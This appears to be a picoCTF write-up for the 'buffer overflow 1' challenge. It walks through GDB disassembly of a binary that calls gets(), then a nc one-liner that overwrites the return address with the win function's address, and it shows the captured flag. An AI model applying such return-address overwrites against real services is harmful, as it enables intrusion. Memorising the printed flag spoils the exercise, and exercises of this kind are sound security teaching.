# buffer overflow 1
## Description
Control the return address  
Now we're cooking! You can overflow the buffer and return to the flag function in the [program](vuln).  
You can view source [here](vuln.c). And connect with it using `nc saturn.picoctf.net 55492`
## Hints
1. Make sure you consider big Endian vs small Endian.
2. Changing the address of the return pointer can call different functions.
## Solution
1. Connect to the server.
```console
% nc saturn.picoctf.net 65514
Please enter your string: 
hello
Okay, time to return... Fingers Crossed... Jumping to 0x804932f
```
2. Well that's interesting. Load it in GDB and inspect `main`. We see it calls `vuln` at `0x0804932a <+102>` with a return address of `0x0804932f <+107>`.
```assembly
0x080492c4 <+0>:	endbr32 
0x080492c8 <+4>:	lea    ecx,[esp+0x4]
0x080492cc <+8>:	and    esp,0xfffffff0
0x080492cf <+11>:	push   DWORD PTR [ecx-0x4]
0x080492d2 <+14>:	push   ebp
0x080492d3 <+15>:	mov    ebp,esp
0x080492d5 <+17>:	push   ebx
0x080492d6 <+18>:	push   ecx
0x080492d7 <+19>:	sub    esp,0x10
0x080492da <+22>:	call   0x8049130 <__x86.get_pc_thunk.bx>
0x080492df <+27>:	add    ebx,0x2d21
0x080492e5 <+33>:	mov    eax,DWORD PTR [ebx-0x4]
0x080492eb <+39>:	mov    eax,DWORD PTR [eax]
0x080492ed <+41>:	push   0x0
0x080492ef <+43>:	push   0x2
0x080492f1 <+45>:	push   0x0
0x080492f3 <+47>:	push   eax
0x080492f4 <+48>:	call   0x80490b0 <setvbuf@plt>
0x080492f9 <+53>:	add    esp,0x10
0x080492fc <+56>:	call   0x8049070 <getegid@plt>
0x08049301 <+61>:	mov    DWORD PTR [ebp-0xc],eax
0x08049304 <+64>:	sub    esp,0x4
0x08049307 <+67>:	push   DWORD PTR [ebp-0xc]
0x0804930a <+70>:	push   DWORD PTR [ebp-0xc]
0x0804930d <+73>:	push   DWORD PTR [ebp-0xc]
0x08049310 <+76>:	call   0x80490d0 <setresgid@plt>
0x08049315 <+81>:	add    esp,0x10
0x08049318 <+84>:	sub    esp,0xc
0x0804931b <+87>:	lea    eax,[ebx-0x1f60]
0x08049321 <+93>:	push   eax
0x08049322 <+94>:	call   0x8049080 <puts@plt>
0x08049327 <+99>:	add    esp,0x10
0x0804932a <+102>:	call   0x8049281 <vuln>
0x0804932f <+107>:	mov    eax,0x0
0x08049334 <+112>:	lea    esp,[ebp-0x8]
0x08049337 <+115>:	pop    ecx
0x08049338 <+116>:	pop    ebx
0x08049339 <+117>:	pop    ebp
0x0804933a <+118>:	lea    esp,[ecx-0x4]
0x0804933d <+121>:	ret  
```
3. What does `vuln` look like? The call to `gets` at `0x0804929e <+29>` is our ticket; `gets` is vulnerable to buffer overflows.
```assembly
0x08049281 <+0>:	endbr32 
0x08049285 <+4>:	push   ebp
0x08049286 <+5>:	mov    ebp,esp
0x08049288 <+7>:	push   ebx
0x08049289 <+8>:	sub    esp,0x24
0x0804928c <+11>:	call   0x8049130 <__x86.get_pc_thunk.bx>
0x08049291 <+16>:	add    ebx,0x2d6f
0x08049297 <+22>:	sub    esp,0xc
0x0804929a <+25>:	lea    eax,[ebp-0x28]
0x0804929d <+28>:	push   eax
0x0804929e <+29>:	call   0x8049050 <gets@plt>
0x080492a3 <+34>:	add    esp,0x10
0x080492a6 <+37>:	call   0x804933e <get_return_address>
0x080492ab <+42>:	sub    esp,0x8
0x080492ae <+45>:	push   eax
0x080492af <+46>:	lea    eax,[ebx-0x1f9c]
0x080492b5 <+52>:	push   eax
0x080492b6 <+53>:	call   0x8049040 <printf@plt>
0x080492bb <+58>:	add    esp,0x10
0x080492be <+61>:	nop
0x080492bf <+62>:	mov    ebx,DWORD PTR [ebp-0x4]
0x080492c2 <+65>:	leave  
0x080492c3 <+66>:	ret
```
4. What other functions are there? The function `win` at `0x080491f6` is interesting. It looks like it loads something from a file and prints it.
```console
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  gets@plt
0x08049060  fgets@plt
0x08049070  getegid@plt
0x08049080  puts@plt
0x08049090  exit@plt
0x080490a0  __libc_start_main@plt
0x080490b0  setvbuf@plt
0x080490c0  fopen@plt
0x080490d0  setresgid@plt
0x080490e0  _start
0x08049120  _dl_relocate_static_pie
0x08049130  __x86.get_pc_thunk.bx
0x08049140  deregister_tm_clones
0x08049180  register_tm_clones
0x080491c0  __do_global_dtors_aux
0x080491f0  frame_dummy
0x080491f6  win
0x08049281  vuln
0x080492c4  main
0x0804933e  get_return_address
0x08049350  __libc_csu_init
0x080493c0  __libc_csu_fini
0x080493c5  __x86.get_pc_thunk.bp
0x080493cc  _fini
```
```assembly
0x080491f6 <+0>:	endbr32 
0x080491fa <+4>:	push   ebp
0x080491fb <+5>:	mov    ebp,esp
0x080491fd <+7>:	push   ebx
0x080491fe <+8>:	sub    esp,0x54
0x08049201 <+11>:	call   0x8049130 <__x86.get_pc_thunk.bx>
0x08049206 <+16>:	add    ebx,0x2dfa
0x0804920c <+22>:	sub    esp,0x8
0x0804920f <+25>:	lea    eax,[ebx-0x1ff8]
0x08049215 <+31>:	push   eax
0x08049216 <+32>:	lea    eax,[ebx-0x1ff6]
0x0804921c <+38>:	push   eax
0x0804921d <+39>:	call   0x80490c0 <fopen@plt>
0x08049222 <+44>:	add    esp,0x10
0x08049225 <+47>:	mov    DWORD PTR [ebp-0xc],eax
0x08049228 <+50>:	cmp    DWORD PTR [ebp-0xc],0x0
0x0804922c <+54>:	jne    0x8049258 <win+98>
0x0804922e <+56>:	sub    esp,0x4
0x08049231 <+59>:	lea    eax,[ebx-0x1fed]
0x08049237 <+65>:	push   eax
0x08049238 <+66>:	lea    eax,[ebx-0x1fd8]
0x0804923e <+72>:	push   eax
0x0804923f <+73>:	lea    eax,[ebx-0x1fa3]
0x08049245 <+79>:	push   eax
0x08049246 <+80>:	call   0x8049040 <printf@plt>
0x0804924b <+85>:	add    esp,0x10
0x0804924e <+88>:	sub    esp,0xc
0x08049251 <+91>:	push   0x0
0x08049253 <+93>:	call   0x8049090 <exit@plt>
0x08049258 <+98>:	sub    esp,0x4
0x0804925b <+101>:	push   DWORD PTR [ebp-0xc]
0x0804925e <+104>:	push   0x40
0x08049260 <+106>:	lea    eax,[ebp-0x4c]
0x08049263 <+109>:	push   eax
0x08049264 <+110>:	call   0x8049060 <fgets@plt>
0x08049269 <+115>:	add    esp,0x10
0x0804926c <+118>:	sub    esp,0xc
0x0804926f <+121>:	lea    eax,[ebp-0x4c]
0x08049272 <+124>:	push   eax
0x08049273 <+125>:	call   0x8049040 <printf@plt>
0x08049278 <+130>:	add    esp,0x10
0x0804927b <+133>:	nop
0x0804927c <+134>:	mov    ebx,DWORD PTR [ebp-0x4]
0x0804927f <+137>:	leave  
0x08049280 <+138>:	ret
```
5. This is straight forward. The `vuln` function reserves `0x24` bytes on the stack, in addition to pushing `EBX` and `EBP` for a total stack depth of `0x2c` or `44` bytes. If we feed the input of the program with `44` bytes of garbage and then insert the address to `win`, we replace the return address from the function call and we'll get our flag.
```console
% (echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xf6\x91\x04\x08"; cat) | nc saturn.picoctf.net 65514
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```
